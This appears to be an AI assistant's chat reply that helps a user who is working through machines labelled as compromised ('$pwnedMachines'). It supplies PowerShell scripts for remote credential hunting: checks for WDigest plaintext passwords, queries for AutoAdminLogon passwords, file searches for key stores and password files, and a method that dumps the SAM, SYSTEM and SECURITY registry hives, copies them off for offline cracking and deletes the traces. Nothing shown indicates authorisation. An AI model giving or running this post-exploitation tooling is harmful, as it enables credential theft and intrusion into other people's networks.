You're right! The `reg save` command shows success but the files aren't actually saved locally. This is a common issue. Here are **real-time alternatives** to view the data without file saving:

## **1. REAL-TIME MEMORY CREDENTIAL CHECK**

```powershell
# Check for in-memory credentials directly
Invoke-Command -ComputerName $pwnedMachines -ScriptBlock {
    Write-Host "=== $env:COMPUTERNAME ===" -ForegroundColor Green
    
    # Check WDigest setting (if enabled, plaintext passwords in memory)
    $wdigest = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -ErrorAction SilentlyContinue
    if ($wdigest.UseLogonCredential -eq 1) {
        Write-Host "[!] WDigest enabled - plaintext passwords potentially in memory" -ForegroundColor Red
    }
    
    # Check cached domain logons
    $cached = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "CachedLogonsCount" -ErrorAction SilentlyContinue
    Write-Host "[+] Cached logons: $($cached.CachedLogonsCount)"
    
    # List local users and their status
    Write-Host "`nLocal Users:" -ForegroundColor Yellow
    net user | Where-Object {$_ -match "^[A-Za-z]"}
}
```

## **2. EXTRACT PASSWORD POLICY FOR OFFLINE CRACKING**

```powershell
# Get domain password policy for hash cracking
Invoke-Command -ComputerName $pwnedMachines -ScriptBlock {
    Write-Host "=== Password Policy on $env:COMPUTERNAME ===" -ForegroundColor Cyan
    net accounts
    
    # Get local user details
    Write-Host "`nLocal User Details:" -ForegroundColor Yellow
    Get-WmiObject Win32_UserAccount | Where-Object {$_.LocalAccount -eq $true} | 
        Select Name, Disabled, PasswordRequired, SID | Format-Table
}
```

## **3. CHECK FOR PLAINTEXT PASSWORDS IN REGISTRY**

```powershell
# Search for passwords in registry remotely
foreach ($computer in $pwnedMachines) {
    try {
        Write-Host "Checking $computer for stored credentials..." -ForegroundColor Cyan
        
        # Check AutoAdminLogon (sometimes contains passwords)
        $autoLogon = reg query "\\$computer\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword 2>$null
        if ($autoLogon) {
            Write-Host "[!] Found AutoAdminLogon password on $computer" -ForegroundColor Red
            $autoLogon
        }
        
        # Check for saved credentials
        $creds = reg query "\\$computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL 2>$null
        if ($creds) {
            Write-Host "[!] Found proxy autoconfig on $computer" -ForegroundColor Yellow
        }
    } catch { Write-Host "[-] Registry query failed: $computer" }
}
```

## **4. SERVICE ACCOUNT EXTRACTION**

```powershell
# Find services with custom accounts (potential credentials)
Invoke-Command -ComputerName $pwnedMachines -ScriptBlock {
    Write-Host "=== Service Accounts on $env:COMPUTERNAME ===" -ForegroundColor Green
    Get-WmiObject Win32_Service | 
        Where-Object {$_.StartName -notlike "NT AUTHORITY*" -and $_.StartName -notlike "LocalSystem"} |
        Select Name, StartName, State | Format-Table
}
```

## **5. SCHEDULED TASK CREDENTIALS**

```powershell
# Check scheduled tasks for stored credentials
Invoke-Command -ComputerName $pwnedMachines -ScriptBlock {
    Write-Host "=== Scheduled Tasks with Credentials on $env:COMPUTERNAME ===" -ForegroundColor Cyan
    Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike "SYSTEM" -and $_.Principal.UserId -notlike "LOCAL SERVICE"} |
        Select TaskName, Principal | Format-Table
}
```

## **6. REAL-TIME LOGGED ON USERS & TOKENS**

```powershell
# Check who's currently logged on (potential token theft)
Invoke-Command -ComputerName $pwnedMachines -ScriptBlock {
    Write-Host "=== Current Logons on $env:COMPUTERNAME ===" -ForegroundColor Yellow
    query user 2>$null
    
    # Check if any privileged users are logged in
    Write-Host "`nPrivileged Groups:" -ForegroundColor Cyan
    net localgroup administrators | Where-Object {$_ -match "\\"}
}
```

## **7. QUICK PASSWORD HUNT**

```powershell
# Search for password-related files and registry entries in real-time
Invoke-Command -ComputerName $pwnedMachines -ScriptBlock {
    Write-Host "=== Password Hunting on $env:COMPUTERNAME ===" -ForegroundColor Magenta
    
    # Common password file patterns
    $passwordFiles = @("*.kdbx", "*.ppk", "*.p12", "*.pfx", "*pass*", "*cred*", "*.vmdk", "*.vhd")
    foreach ($pattern in $passwordFiles) {
        Get-ChildItem "C:\" -Recurse -Include $pattern -ErrorAction SilentlyContinue | 
            Select FullName, Length | Format-Table
    }
}
```

## **8. ALTERNATIVE REGISTRY EXPORT (WORKING METHOD)**

If you really need the registry hives, try this working method:

```powershell
# Use Invoke-Command to run reg save on the remote machine first
Invoke-Command -ComputerName $pwnedMachines -ScriptBlock {
    reg save hklm\sam C:\Windows\Temp\sam.save 2>$null
    reg save hklm\system C:\Windows\Temp\system.save 2>$null
    reg save hklm\security C:\Windows\Temp\security.save 2>$null
    "Registry hives saved locally on target"
}

# Then copy them to your machine
foreach ($computer in $pwnedMachines) {
    Copy-Item "\\$computer\C$\Windows\Temp\sam.save" "C:\temp\$computer-sam.hiv" -ErrorAction SilentlyContinue
    Copy-Item "\\$computer\C$\Windows\Temp\system.save" "C:\temp\$computer-system.hiv" -ErrorAction SilentlyContinue
    # Clean up
    Invoke-Command -ComputerName $computer -ScriptBlock {
        Remove-Item "C:\Windows\Temp\*.save" -Force -ErrorAction SilentlyContinue
    }
}
```

## **Quick Real-Time Check Command:**

```powershell
# One-liner to check all compromised machines for valuable info
$pwnedMachines | ForEach-Object { 
    Write-Host "=== REAL-TIME CHECK: $_ ===" -ForegroundColor White -BackgroundColor DarkBlue
    Invoke-Command -ComputerName $_ -ScriptBlock { 
        "Last boot: " + (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
        "Logged on users: "; query user 2>$null
        "WDigest: " + (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -ErrorAction SilentlyContinue).UseLogonCredential
    } 
}
```

The real-time commands will give you immediate visibility without dealing with file transfer issues!
